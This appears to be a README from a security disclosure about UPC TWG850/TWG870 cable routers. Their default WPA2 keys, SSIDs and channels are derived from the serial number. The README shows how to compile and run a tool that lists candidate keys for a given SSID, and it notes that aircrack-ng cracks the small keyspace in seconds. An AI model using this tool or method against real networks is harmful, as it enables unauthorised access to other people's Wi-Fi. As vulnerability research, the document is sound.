# TWG850/TWG870 WPA2 keys

Same as in the [Technicolor TC7200.U](https://haxx.in/upc-wifi/), the Wi-Fi SSID and
password are derived from the device's serial number.
However, for the TWG850-4U, there are around 8000-12000
possible WPA2 keys for each UPC%06d SSID and around 4000
for the TWG870's UPC%07d SSID, as opposed
to ~20 keys in the TC7200.U - still good enough for
a dictionary attack though: `aircrack-ng` takes less
than 5 seconds.


On both devices, the default WiFi channel number is also derived 
from the serial number (1 or 6 for the TWG850-4U, and 1, 6 or 11
on the TWG870). The channel number printed on the label of
TWG850-4U units is **not** used!

`$ cc upc-twg8x0.c -o upc-twg8x0`

Print WPA2 key and SSID for a TWG850 with serial number
`00939-907201352`.

```
$ ./upc-twg8x0 twg850 00939907201352
00939-907201352  6   UPC009038  AALOMMAA
```
Get serial numbers and WPA2 keys for SSID `UPC009065`

<pre>
$ ./upc-twg8x0 twg850 UPC009065
[...]
00939-907002034  1   UPC009065  IQVCGOKQ  
00939-907101693  6   UPC009065  IUQQQCBY  
<b>00939-907201352  6   UPC009065  AALOMMAA</b>
00939-907301011  1   UPC009065  QGGQKWBE  
00939-907400670  6   UPC009065  EIMDZWKS
[...]
</pre>

Same as above, but limit search to channel 6

<pre>
$ ./upc-twg8x0 twg850 UPC009065 6
[...]
00939-906500332  6   UPC009065  BDMWZWKE  
00939-907101693  6   UPC009065  IUQQQCBY  
<b>00939-907201352  6   UPC009065  AALOMMAA</b>
00939-907400670  6   UPC009065  EIMDZWKS  
00939-907500329  6   UPC009065  CSAAAAYZ
[...]
</pre>


